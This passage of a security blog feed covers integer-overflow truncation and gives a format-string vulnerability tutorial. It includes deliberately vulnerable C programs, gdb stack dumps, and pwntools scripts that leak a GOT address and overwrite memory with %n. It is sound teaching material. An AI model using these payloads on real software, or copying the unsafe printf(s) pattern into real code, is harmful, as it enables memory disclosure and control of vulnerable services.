<p>The <code>long integer</code> occupies 8 bytes of memory space, while the <code>integer</code> has only 4 bytes of memory space, so when <code>long</code> is converted to <code>int</code>, it will cause truncation, and only the low 4 bytes of the long integer will be passed to the integer variable.</p>
<p>In this example, it converts <code>long: 0x100000000</code> to <code>int: 0x00000000</code>.</p>
<p>But when passing a smaller variable value to a larger variable, it causes no data loss.</p>
<ol start="2">
<li>Only Unilateral Restrictions.</li>
</ol>
<p>This case is only for signed types<br>Example <code>intof3.c</code>:</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">            <span class="keyword">int</span> len, l;</span><br><span class="line">            <span class="keyword">char</span> buf[<span class="number">11</span>];</span><br><span class="line"></span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;len);</span><br><span class="line">            <span class="keyword">if</span> (len &lt; <span class="number">10</span>) &#123;</span><br><span class="line">                    l = <span class="built_in">read</span>(<span class="number">0</span>, buf, len);</span><br><span class="line">                    *(buf+l) = <span class="number">0</span>;</span><br><span class="line">                    <span class="built_in">puts</span>(buf);</span><br><span class="line">            &#125; <span class="keyword">else</span></span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot;Please len &lt; 10&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Compile and run:</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ gcc intof3.c  -o intof3</span><br><span class="line">intof3.c: In <span class="keyword">function</span> ‘main’:</span><br><span class="line">intof3.c:10:11: warning: implicit declaration of <span class="keyword">function</span> ‘<span class="built_in">read</span>’; did you mean ‘fread’? [-Wimplicit-function-declaration]</span><br><span class="line">   10 |       l = <span class="built_in">read</span>(0, buf, len);</span><br><span class="line">      |           ^~~~</span><br><span class="line">      |           fread</span><br><span class="line">$ ./intof3</span><br><span class="line">20                      <span class="comment"># first input 20</span></span><br><span class="line">Please len &lt; 10</span><br><span class="line">$ ./intof3</span><br><span class="line">5                       <span class="comment"># then input 5</span></span><br><span class="line">1234567890</span><br><span class="line">12345</span><br><span class="line">$ 67890</span><br><span class="line">-bash: 67890: <span class="built_in">command</span> not found</span><br><span class="line">$ ./intof3</span><br><span class="line">-1                      <span class="comment"># last input -1</span></span><br><span class="line">12345678901234567890</span><br><span class="line">123456789012345</span><br><span class="line">$</span><br></pre></td></tr></table></figure>
<p>It seems that we restrict <code>len</code> to be smaller than <code>10</code>, but when <code>len</code> is negative, in <code>read</code> function <code>len</code> will be regarded as <code>unsigned long int</code>.</p>
<p>The two cases in the above examples have a commonality, that is, the formal parameters of the function and the arguments are different, so I think it can be summarized as the wrong type conversion.</p>
]]></content>
      <categories>
        <category>Pwn</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>linux</tag>
        <tag>integer-overflow</tag>
      </tags>
  </entry>
  <entry>
    <title>Format String Vulnerability Intro</title>
    <url>/2020/07/05/2020-07-05-Format-String-Vulnerability-Intro/</url>
    <content><![CDATA[<p>The format string in many programming languages, refers to a control parameter used by a class of functions. It helps to output text in specific format, according to conversion specification or format specifiers that user set.</p>
<p>Here we discuss it on <code>Linux</code>.</p>
<h2 id="Format-String-Introduction"><a href="#Format-String-Introduction" class="headerlink" title="Format String Introduction"></a>Format String Introduction</h2><p>For <code>C</code> format string functions, characters are usually copied literally into the function’s output, but format specifiers, which start with a <code>%</code> character, indicate the location and method to translate a piece of data (such as a number) to characters.</p>
<p>We take <code>printf</code> as an example.<br><img src="/imghost/fsvi/example.png" alt="example"></p>
<p>Format string functions include:</p>
<table>
<thead>
<tr>
<th>method name</th>
<th>method function</th>
</tr>
</thead>
<tbody><tr>
<td>scanf</td>
<td>scan input format string</td>
</tr>
<tr>
<td>printf</td>
<td>output to stdout</td>
</tr>
<tr>
<td>fprintf</td>
<td>output to FILE stream</td>
</tr>
<tr>
<td>vprintf</td>
<td>output to stdout according to parameter list</td>
</tr>
<tr>
<td>vfprintf</td>
<td>output to FILE stream according to parameter list</td>
</tr>
<tr>
<td>sprintf</td>
<td>output to string</td>
</tr>
<tr>
<td>snprintf</td>
<td>output assigned number chars to string</td>
</tr>
<tr>
<td>vsprintf</td>
<td>output to string according to parameter list</td>
</tr>
<tr>
<td>vsnprintf</td>
<td>output specified number chars to string according to …</td>
</tr>
<tr>
<td>setproctitle</td>
<td>set argv</td>
</tr>
<tr>
<td>syslog</td>
<td>output log</td>
</tr>
<tr>
<td>err, verr, warn, vwarn, etc.</td>
<td>error and warning output</td>
</tr>
</tbody></table>
<p>Basic format is <code>%[parameter][flags][field width][.precision][length]type</code>, and you can check <a class="link"   href="https://en.wikipedia.org/wiki/Printf_format_string" >this site<i class="fas fa-external-link-alt"></i></a> for meanings of every patterns.</p>
<p>Things we need to focus on:</p>
<ul>
<li>parameter<ul>
<li><code>n$</code>:        get specific parameter in format string</li>
</ul>
</li>
<li>flag</li>
<li>field width<ul>
<li>minimum width to output</li>
</ul>
</li>
<li>precision<ul>
<li>maximum width to output</li>
</ul>
</li>
<li>length<ul>
<li><code>hh</code>:        output a byte</li>
<li><code>h</code>:         Output a double byte</li>
</ul>
</li>
<li>type<ul>
<li><code>d/i</code>:       signed int</li>
<li><code>u</code>:         unsigned int</li>
<li><code>x/X</code>:       hex unsigned int</li>
<li><code>o</code>:         octal unsigned int</li>
<li><code>s</code>:         string (var assigns start address)</li>
<li><code>c</code>:         character</li>
<li><code>p</code>:         variable address</li>
<li><code>n</code>:         number of written chars</li>
<li><code>%</code>:         just <code>%</code></li>
</ul>
</li>
</ul>
<h2 id="Vulnerability-Principle"><a href="#Vulnerability-Principle" class="headerlink" title="Vulnerability Principle"></a>Vulnerability Principle</h2><p>The <code>printf</code> reads given characters one by one.</p>
<ul>
<li>If not <code>%</code>, output to <code>stdout</code>. </li>
<li>If <code>%</code> appears, read next,<ul>
<li>If no chars following, error report.</li>
<li>If <code>%</code> appears, output <code>%</code>.</li>
<li>If other chars show up, analyze and output according to the parameters.</li>
</ul>
</li>
</ul>
<p>If we write <code>printf</code> wrongly like:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Color %s, Number %d, Float %4.2f&quot;</span>);</span><br></pre></td></tr></table></figure>
<p>Without any following parameters, <code>printf</code> will get variables from the stack memory (from top of the stack to bottom).<br>For one thing, if it reads illegal data, the program crashes; for another thing, the output can be regarded as stack data leaking.</p>
<h2 id="Format-String-Exploit"><a href="#Format-String-Exploit" class="headerlink" title="Format String Exploit"></a>Format String Exploit</h2><p>Vulnerability comes with incorrect usage, like no parameters given after the format specifiers.</p>
<p>Here is a vulnerable code sample (fmtstr.c):</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="keyword">int</span> a = <span class="number">123</span>,b = <span class="number">456</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">int</span> c = <span class="number">789</span>;</span><br><span class="line">        <span class="keyword">char</span> s[<span class="number">100</span>];</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;input:&quot;</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, s);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;output:&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(s);      <span class="comment">//vulnerable</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>And the instruction to compile (we start from 32-bit, and no protection program):</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ gcc -m32 -fno-stack-protector -no-pie -o fmtstr fmtstr.c</span><br></pre></td></tr></table></figure>

<p>There are 3 ways to exploit:</p>
<ul>
<li>program crashing</li>
<li>memory data leaking</li>
<li>memory data overwriting</li>
</ul>
<h3 id="Crash-program"><a href="#Crash-program" class="headerlink" title="Crash program"></a>Crash program</h3><p>Use lots of <code>%s</code> to let program read many undefined memory areas is the easist way.<br>This may not let you control program, but crashing remote service contributes to attacks like denial of service.</p>
<p>But have you ever considered, how many <code>%s</code> are enough? and why?<br>We play with <code>fmtstr</code> that is compiled above. The relationship between inputs and outputs is:</p>
<table>
<thead>
<tr>
<th>Input</th>
<th>Output</th>
</tr>
</thead>
<tbody><tr>
<td>%s%s%s</td>
<td>%s%s%sW.</td>
</tr>
<tr>
<td>%s%s%s%s%s</td>
<td>%s%s%s%s%sW.(null)(null)</td>
</tr>
<tr>
<td>%s%s%s%s%s%s…</td>
<td>Segmentation fault</td>
</tr>
</tbody></table>
<p>USe gdb to analyze. Set a breakpoint to debug.</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ gdb fmtstr -q</span><br><span class="line">GEF <span class="keyword">for</span> linux ready, <span class="built_in">type</span> <span class="string">&#x27;gef&#x27;</span> to start, <span class="string">&#x27;gef config&#x27;</span> to configure</span><br><span class="line">88 commands loaded <span class="keyword">for</span> GDB 9.2 using Python engine 3.8</span><br><span class="line">Reading symbols from fmtstr...</span><br><span class="line">(No debugging symbols found <span class="keyword">in</span> fmtstr)</span><br><span class="line">gef➤  b <span class="built_in">printf</span></span><br><span class="line">Breakpoint 1 at 0x8049030</span><br><span class="line">gef➤  r</span><br><span class="line">Starting program: /root/fmtstr</span><br><span class="line">input:</span><br><span class="line">%s%s%s          <span class="comment"># my input</span></span><br><span class="line">output:</span><br><span class="line"></span><br><span class="line">Breakpoint 1, 0xf7e31a90 <span class="keyword">in</span> <span class="built_in">printf</span> () from /lib/i386-linux-gnu/libc.so.6</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>Let’s look at the stack, since this vulnerability comes from no following parameters for potential format specifiers, so the format string functions will take parameters from stack.</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">────────────────── stack ────</span><br><span class="line">0xffffd38c│+0x0000: 0x080491fc  →  &lt;main+106&gt; add esp, 0x10     ← <span class="variable">$esp</span></span><br><span class="line">0xffffd390│+0x0004: 0xffffd3a8  →  <span class="string">&quot;%s%s%s&quot;</span></span><br><span class="line">0xffffd394│+0x0008: 0xffffd3a8  →  <span class="string">&quot;%s%s%s&quot;</span>     <span class="comment"># 1st</span></span><br><span class="line">0xffffd398│+0x000c: 0xf7ffd940  →  0x00000000   <span class="comment"># 2nd</span></span><br><span class="line">0xffffd39c│+0x0010: 0x080491a9  →  &lt;main+23&gt; add ebx, 0x2e57    <span class="comment"># 3rd</span></span><br><span class="line">0xffffd3a0│+0x0014: 0x00000000      <span class="comment"># 4th</span></span><br><span class="line">0xffffd3a4│+0x0018: 0x00000000      <span class="comment"># 5th</span></span><br><span class="line">0xffffd3a8│+0x001c: <span class="string">&quot;%s%s%s&quot;</span>        <span class="comment"># 6th</span></span><br><span class="line">...</span><br><span class="line">───────────────────</span><br></pre></td></tr></table></figure>
<p>The current top of stack is <code>0xffffd38c</code>, storing <code>esp</code>. Value in <code>0xffffd390</code> is 1st parameter of <code>printf</code> function, while value in <code>0xffffd394</code> is 1st parameter of format string (2nd parameter of <code>printf</code>).</p>
<p>We use <code>%s</code> to output what the values saved in stack point to (regard values in stack as string starting addresses). Let’s see what exactly do they point to.</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">gef➤  x/x xffffd3a8</span><br><span class="line">0xffffd3a8:     0x73257325  </span><br><span class="line">gef➤  x/x 0xf7ffd940</span><br><span class="line">0xf7ffd940:     0x00000000</span><br><span class="line">gef➤  x/x 0x080491a9</span><br><span class="line">0x80491a9 &lt;main+23&gt;:    0x2e57c381</span><br><span class="line">gef➤  x/x 0x00000000</span><br><span class="line">0x0:    Cannot access memory at address 0x0</span><br><span class="line">gef➤  x/x <span class="string">&quot;%s%s%s&quot;</span>        <span class="comment"># the 6th parameter for format string </span></span><br><span class="line">0xf7fce670:     0x73257325</span><br><span class="line">gef➤  x/x %s%s%s</span><br><span class="line">A syntax error <span class="keyword">in</span> expression, near <span class="string">&#x27;%s%s%s&#x27;</span>.</span><br><span class="line">gef➤  x/x 0xffffd3a8</span><br><span class="line">0xffffd3a8:     0x73257325</span><br><span class="line">gef➤  x/x 0x73257325</span><br><span class="line">0x73257325:     Cannot access memory at address 0x73257325</span><br><span class="line">gef➤  c</span><br><span class="line">Continuing.</span><br><span class="line">%s%s%sW.</span><br><span class="line">[Inferior 1 (process 1419) exited normally]</span><br></pre></td></tr></table></figure>
<p>The above are display of 1st, 2nd, 3rd, 4th … parameter that in order.<br>Normally values in stack will change on different pc, and different time to run. We can see that our input is 6th parameter, however this is fixed, because this order is determined by order of program instructions.</p>
<p>Here we can also know how many <code>%s</code> are enough to crash it. Each <code>%s</code> we feed will print a item on the stack, and when the item (regarded as address) points to somewhere inaccessible, program breaks down.</p>
<p>As we can see, though 4th and 5th parameter are <code>0x00000000</code> which points to a definitely inaccessible place, they are translated as pointing to null. So the first parameter that causes crashing is actually 6th item. If you notice, it happens to be the input string.<br>So the answer is, 6 <code>%s</code> is just enough (the more the better).</p>
<h3 id="Leak-Memory"><a href="#Leak-Memory" class="headerlink" title="Leak Memory"></a>Leak Memory</h3><p>It includes the following operations.</p>
<ul>
<li>Leak stack memory data<ul>
<li>Get variable value</li>
<li>Get memory that var value (address) points to</li>
</ul>
</li>
<li>Leak any address data<ul>
<li>Use <code>GOT</code> to get <code>libc</code> addr</li>
<li>To dump all the program</li>
</ul>
</li>
</ul>
<p>The basic principle is using format like <code>%n$p</code> or <code>%n$x</code>, even <code>%n$s</code> to leak data in stack memory. <code>%p</code> is a better choice than <code>%x</code> to print data, because <code>%x</code> will print different content in 32-bit and 64-bit environments.</p>
<h4 id="Leak-Stack"><a href="#Leak-Stack" class="headerlink" title="Leak Stack"></a>Leak Stack</h4><p>The format string <code>%order$p</code> refers to printing the number <code>order</code> format string parameter. We can use <code>%10000000$p</code> to leak 10000000th parameter, instead of using 10,000,000 <code>%p</code> like what former section does. In theory, we can disclose whatever item on stack.</p>
<p>Run <code>fmtstr</code> to show the effect. I feed <code>%6$p</code> to leak input string.</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ gdb fmtstr -q</span><br><span class="line">GEF <span class="keyword">for</span> linux ready, <span class="built_in">type</span> <span class="string">&#x27;gef&#x27;</span> to start, <span class="string">&#x27;gef config&#x27;</span> to configure</span><br><span class="line">88 commands loaded <span class="keyword">for</span> GDB 9.2 using Python engine 3.8</span><br><span class="line">Reading symbols from fmtstr...</span><br><span class="line">(No debugging symbols found <span class="keyword">in</span> fmtstr)</span><br><span class="line">gef➤  b <span class="built_in">printf</span></span><br><span class="line">Breakpoint 1 at 0x8049030</span><br><span class="line">gef➤  r</span><br><span class="line">Starting program: /root/fmtstr</span><br><span class="line">input:</span><br><span class="line">%6<span class="variable">$p</span></span><br><span class="line">output:</span><br><span class="line"></span><br><span class="line">Breakpoint 1, 0xf7e31a90 <span class="keyword">in</span> <span class="built_in">printf</span> () from /lib/i386-linux-gnu/libc.so.6</span><br><span class="line">[ Legend: Modified register | Code | Heap | Stack | String ]</span><br><span class="line">...</span><br><span class="line">─────────────────── stack ────</span><br><span class="line">0xffffd39c│+0x0000: 0x080491fc  →  &lt;main+106&gt; add esp, 0x10     ← <span class="variable">$esp</span></span><br><span class="line">0xffffd3a0│+0x0004: 0xffffd3b8  →  <span class="string">&quot;%6<span class="variable">$p</span>&quot;</span></span><br><span class="line">0xffffd3a4│+0x0008: 0xffffd3b8  →  <span class="string">&quot;%6<span class="variable">$p</span>&quot;</span>       <span class="comment"># 1st</span></span><br><span class="line">0xffffd3a8│+0x000c: 0xf7ffd940  →  0x00000000   <span class="comment"># 2nd</span></span><br><span class="line">0xffffd3ac│+0x0010: 0x080491a9  →  &lt;main+23&gt; add ebx, 0x2e57    <span class="comment"># 3rd</span></span><br><span class="line">0xffffd3b0│+0x0014: 0x00000000      <span class="comment"># 4th</span></span><br><span class="line">0xffffd3b4│+0x0018: 0x00000000      <span class="comment"># 5th</span></span><br><span class="line">0xffffd3b8│+0x001c: <span class="string">&quot;%6<span class="variable">$p</span>&quot;</span>          <span class="comment"># 6th</span></span><br><span class="line">─────────────────── </span><br><span class="line">...</span><br><span class="line">gef➤  c</span><br><span class="line">Continuing.</span><br><span class="line">0x70243625          <span class="comment"># &quot;%6$p&quot; ascii codes</span></span><br><span class="line">[Inferior 1 (process 176) exited normally]</span><br></pre></td></tr></table></figure>
<p><code>%p</code> is used to print pointers, <code>%x</code> is used to print data in hex, while <code>%s</code> prints what a pointer points to. so we can use it to do more creative things.</p>
<h4 id="Leak-Any"><a href="#Leak-Any" class="headerlink" title="Leak Any"></a>Leak Any</h4><p>Now we can find our input in stack, and we have <code>%s</code> to leak what a pointer points to. What if we input address to be a pointer, and use <code>%s</code> to leak where it points? In theory, we can leak anywhere.</p>
<p>The basic exploit format is <code>addr%order$s</code>. As the address is hard to input in <code>stdin</code>, so I choose <code>pwntools</code> to do this.<br>Choosing <code>__isoc99_scanf@got</code> as the aim to leak is to prove the ability of leaking anywhere. The exploit script <code>leakanywhere.py</code> is:</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">sh = process(<span class="string">&#x27;./fmtstr&#x27;</span>)</span><br><span class="line">fmts = ELF(<span class="string">&#x27;./fmtstr&#x27;</span>)</span><br><span class="line">__isoc99_scanf_got = fmts.got[<span class="string">&#x27;__isoc99_scanf&#x27;</span>] <span class="comment"># get `got` address of `scanf`</span></span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(__isoc99_scanf_got)</span><br><span class="line">payload = p32(__isoc99_scanf_got) + <span class="string">&#x27;%6$s&#x27;</span>      <span class="comment"># building payload</span></span><br><span class="line"><span class="built_in">print</span> payload</span><br><span class="line">gdb.attach(sh)                                  <span class="comment"># gdb debug</span></span><br><span class="line"><span class="built_in">print</span> sh.recv()</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">recv = sh.recv()</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;--------------------------&#x27;</span></span><br><span class="line"><span class="built_in">print</span> recv</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;--------------------------&#x27;</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;scanf@got is: &#x27;</span>+<span class="built_in">hex</span>(u32(recv[<span class="number">12</span>:<span class="number">16</span>]))    <span class="comment"># get leaked &#x27;got&#x27; item content</span></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
<p>The result of running it:</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ python leakanywhere.py </span><br><span class="line">[+] Starting <span class="built_in">local</span> process <span class="string">&#x27;./fmtstr&#x27;</span>: pid 2770</span><br><span class="line">[*] <span class="string">&#x27;/mnt/hgfs/Sandbox/fmtstr&#x27;</span></span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br><span class="line">0x804c01c</span><br><span class="line">\x1c\x04%6<span class="variable">$s</span></span><br><span class="line">[*] running <span class="keyword">in</span> new terminal: /usr/bin/gdb -q  <span class="string">&quot;./fmtstr&quot;</span> 2770</span><br><span class="line">[+] Waiting <span class="keyword">for</span> debugger: Done</span><br><span class="line">input:</span><br><span class="line"></span><br><span class="line">--------------------------</span><br><span class="line">output:</span><br><span class="line">\x1c\x04\x90j��</span><br><span class="line"></span><br><span class="line">--------------------------</span><br><span class="line">scanf@got is: 0xf7d76a90</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">[*] Process <span class="string">&#x27;./fmtstr&#x27;</span> stopped with <span class="built_in">exit</span> code 0 (pid 2770)</span><br><span class="line">[*] Got EOF <span class="keyword">while</span> reading <span class="keyword">in</span> interactive</span><br><span class="line">$  </span><br></pre></td></tr></table></figure>
<p>The address <code>0xf7d76a90</code> seems to be what <code>scanf@got</code> points to (where scanf really is). It changes everytime you run the script.</p>
<h3 id="Overwrite-Memory"><a href="#Overwrite-Memory" class="headerlink" title="Overwrite Memory"></a>Overwrite Memory</h3><p>Another impressive format specifier is <code>%n</code>, outputting not characters, but number of successfully printed characters. This provides us with a new method to write things to assigned place.<br>The basic principle of overwrite memory is using format like <code>...[overwrite addr]....%[overwrite offset]$n</code>, and the <code>...</code> means padding we need to make a certain amount for output.</p>
<p>We write <code>overwrite.c</code> as an example to better find out what we can do:</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="keyword">int</span> a = <span class="number">123</span>, b = <span class="number">456</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">int</span> c = <span class="number">789</span>;</span><br><span class="line">        <span class="keyword">char</span> s[<span class="number">100</span>];</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%p\n&quot;</span>, &amp;c);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;input:&quot;</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, s);</span><br><span class="line">        <span class="built_in">printf</span>(s);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;----------------&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span>(c == <span class="number">16</span>)&#123;</span><br><span class="line">                <span class="built_in">puts</span>(<span class="string">&quot;Path 1&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(a == <span class="number">2</span>)&#123;</span><br><span class="line">                <span class="built_in">puts</span>(<span class="string">&quot;Path 2&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(b == <span class="number">0xdeadbeef</span>)&#123;</span><br><span class="line">                <span class="built_in">puts</span>(<span class="string">&quot;Path 3&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Compile it (32-bit makes it easier to analyze, because 64-bit program saves first 6 args in registers on Linux).</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ gcc -m32 -o overwrite overwrite.c -no-pie</span><br></pre></td></tr></table></figure>
<h4 id="Basic"><a href="#Basic" class="headerlink" title="Basic"></a>Basic</h4><p>The first aim is to reach <code>Path 1</code>. As <code>ASLR</code> is enabled, address of variable on stack like <code>c</code> changes each turn, so here I give address of <code>c</code> intentionally.</p>
<p>Since we need to write <code>16</code> to <code>c</code>, it requires address of <code>c</code> that we already got, and the order of our input. The exploit will be built like: <code>[addr][padding]%order$n</code>.</p>
<p>Determine the <code>order</code>.</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">gdb ./overwrite -q</span><br><span class="line">GEF <span class="keyword">for</span> linux ready, <span class="built_in">type</span> <span class="string">&#x27;gef&#x27;</span> to start, <span class="string">&#x27;gef config&#x27;</span> to configure</span><br><span class="line">88 commands loaded <span class="keyword">for</span> GDB 9.2 using Python engine 3.8</span><br><span class="line">Reading symbols from ./overwrite...</span><br><span class="line">(No debugging symbols found <span class="keyword">in</span> ./overwrite)</span><br><span class="line">gef➤  b <span class="built_in">printf</span></span><br><span class="line">Breakpoint 1 at 0x1030</span><br><span class="line">gef➤  r</span><br><span class="line">Starting program: /root/overwrite</span><br><span class="line">...</span><br><span class="line">gef➤  c</span><br><span class="line">Continuing.</span><br><span class="line">0xffffd41c</span><br><span class="line">input:</span><br><span class="line">%p%p%p%p%p%p</span><br><span class="line"></span><br><span class="line">Breakpoint 1, 0xf7e31a90 <span class="keyword">in</span> <span class="built_in">printf</span> () from /lib/i386-linux-gnu/libc.so.6</span><br><span class="line">[ Legend: Modified register | Code | Heap | Stack | String ]</span><br><span class="line">...</span><br><span class="line">──────────────────── stack ────</span><br><span class="line">0xffffd39c│+0x0000: 0x56556227  →  &lt;main+110&gt; add esp, 0x10      ← <span class="variable">$esp</span></span><br><span class="line">0xffffd3a0│+0x0004: 0xffffd3b8  →  <span class="string">&quot;%p%p%p%p%p%p&quot;</span></span><br><span class="line">0xffffd3a4│+0x0008: 0xffffd3b8  →  <span class="string">&quot;%p%p%p%p%p%p&quot;</span></span><br><span class="line">0xffffd3a8│+0x000c: 0xf7ffd940  →  0x56555000  →  0x464c457f</span><br><span class="line">0xffffd3ac│+0x0010: 0x565561d0  →  &lt;main+23&gt; add ebx, 0x2e30</span><br><span class="line">0xffffd3b0│+0x0014: 0x00000000</span><br><span class="line">0xffffd3b4│+0x0018: 0x00000000</span><br><span class="line">0xffffd3b8│+0x001c: <span class="string">&quot;%p%p%p%p%p%p&quot;</span></span><br><span class="line">...</span><br><span class="line">─────────────────────────</span><br><span class="line">gef➤</span><br></pre></td></tr></table></figure>
<p>our input <code>%p%p%p%p%p%p</code> is the 6th parameter of format string (7th parameter of func <code>printf</code>), so <code>order</code> should be <code>6</code>. The addr will be in received contents, so the exploit script goes like:</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">sh = process(<span class="string">&#x27;./overwrite&#x27;</span>)</span><br><span class="line">recv1 = sh.recvuntil(<span class="string">&#x27;\n&#x27;</span>, drop=<span class="literal">True</span>)</span><br><span class="line"><span class="built_in">print</span> recv1</span><br><span class="line">c_addr = <span class="built_in">int</span>(recv1, <span class="number">16</span>)</span><br><span class="line">payload = p32(c_addr) + <span class="string">&#x27;%012d&#x27;</span> + <span class="string">&#x27;%6$n&#x27;</span></span><br><span class="line"><span class="built_in">print</span> payload</span><br><span class="line"><span class="comment">#gdb.attach(sh)</span></span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.recv()</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
<p>Finally reach the <code>Path 1</code>. </p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ python path1.py</span><br><span class="line">[+] Starting <span class="built_in">local</span> process <span class="string">&#x27;./overwrite&#x27;</span>: pid 660</span><br><span class="line">0xffda4b2c</span><br><span class="line">,K%012d%6<span class="variable">$n</span></span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">[*] Process <span class="string">&#x27;./overwrite&#x27;</span> stopped with <span class="built_in">exit</span> code 0 (pid 660)</span><br><span class="line">,K-00002471224----------------</span><br><span class="line">Path 1</span><br><span class="line">[*] Got EOF <span class="keyword">while</span> reading <span class="keyword">in</span> interactive</span><br><span class="line">$</span><br></pre></td></tr></table></figure>
<p>Here we use <code>%012d</code> instead of concrete 12 letters, to show more possibilities. When running, <code>%012d</code> will be replaced by 12 integers and   </p>
<h4 id="Advanced"><a href="#Advanced" class="headerlink" title="Advanced"></a>Advanced</h4><p>Though the <code>[addr][padding]%order$s</code> is enough for <code>Path 1</code>, what about <code>Path 2</code> and <code>Path 3</code>?</p>
<p>For <code>Path 2</code> we have to set variable <code>a</code> to be <code>2</code>. If we still using format <code>[addr][padding]%order$s</code>, even if <code>[addr]</code> part is beyond 4 characters.</p>
<p>Actually it is flexible. Put <code>[addr]</code> back to build <code>aa%order$n[padding][addr]</code>, then determine <code>order</code>, <code>[padding]</code> and <code>[addr]</code>.</p>
<p>First check the stack</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ gdb ./overwrite -q</span><br><span class="line">...</span><br><span class="line">gef➤  c</span><br><span class="line">Continuing.</span><br><span class="line">0xffffd41c</span><br><span class="line">input:</span><br><span class="line">abcdefghqwerasdf</span><br><span class="line"></span><br><span class="line">Breakpoint 1, 0xf7e31a90 <span class="keyword">in</span> <span class="built_in">printf</span> () from /lib/i386-linux-gnu/libc.so.6</span><br><span class="line">[ Legend: Modified register | Code | Heap | Stack | String ]</span><br><span class="line">...</span><br><span class="line">──────────────────── stack ────</span><br><span class="line">0xffffd39c│+0x0000: 0x56556227  →  &lt;main+110&gt; add esp, 0x10      ← <span class="variable">$esp</span></span><br><span class="line">0xffffd3a0│+0x0004: 0xffffd3b8  →  <span class="string">&quot;abcdefghqwerasdf&quot;</span></span><br><span class="line">0xffffd3a4│+0x0008: 0xffffd3b8  →  <span class="string">&quot;abcdefghqwerasdf&quot;</span></span><br><span class="line">0xffffd3a8│+0x000c: 0xf7ffd940  →  0x56555000  →  0x464c457f</span><br><span class="line">0xffffd3ac│+0x0010: 0x565561d0  →  &lt;main+23&gt; add ebx, 0x2e30</span><br><span class="line">0xffffd3b0│+0x0014: 0x00000000</span><br><span class="line">0xffffd3b4│+0x0018: 0x00000000</span><br><span class="line">0xffffd3b8│+0x001c: <span class="string">&quot;abcdefghqwerasdf&quot;</span></span><br><span class="line">───────────────────────────</span><br><span class="line">gef➤  x/x 0xffffd3b8</span><br><span class="line">0xffffd3b8:     0x64636261      <span class="comment"># `abcd` in little-endian</span></span><br><span class="line">gef➤  x/x 0xffffd3bc</span><br><span class="line">0xffffd3bc:     0x68676665      <span class="comment"># 